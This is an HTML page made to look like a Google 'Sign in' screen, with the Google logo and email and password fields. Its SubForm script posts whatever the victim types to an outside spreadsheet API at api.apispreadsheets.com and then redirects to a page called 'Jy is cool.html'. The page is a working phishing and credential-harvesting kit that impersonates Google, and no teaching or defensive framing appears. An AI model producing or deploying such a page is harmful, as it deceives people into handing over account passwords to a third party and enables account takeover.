<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <script
		src="https://code.jquery.com/jquery-3.4.1.js"
		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
		crossorigin="anonymous"></script>
	<script>
		function SubForm (){
            
            document.getElementById("input2").type = "text";
			$.ajax({
				url:"https://api.apispreadsheets.com/data/20922/",
				type:"post",
				data:$("#myForm").serializeArray(),
				success: function(){
					window.location.href = 'Jy is cool.html';
				},
				error: function(){
                    alert("Error...")
				}
			});

		}
	</script>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <script src="script.js"></script>
        <form id= "myForm" method="post">
            <div id="title">
                <img src="googlelogo_color_160x56dp.png" alt="" srcset="" id="googlePic">
                <h1 id="title1">Sign in</h1>
                <h3 id="title2">to continue</h3>
            </div>
            <div id="inputField">
                <h4 id="textAboveInput">Email</h4>
                <input type="text" name="Email" id="input"> <br>
            </div>

            <div id="inputField2">
                <h4 id="textAboveInput">Password</h4>
                <input type="Password" name="Password" id="input2"> <br>
                <a href="Something went wrong.html" id="forgotEmail">Forgot password?</a>
            </div>
            <div id="buttons">
                <input type="button" value="Create account" id="CA_button" onclick="createAccount()">
                <input type="button" value="Login" id="N_button" onclick="SubForm()">
            </div>
        </form>
</body>
</html>
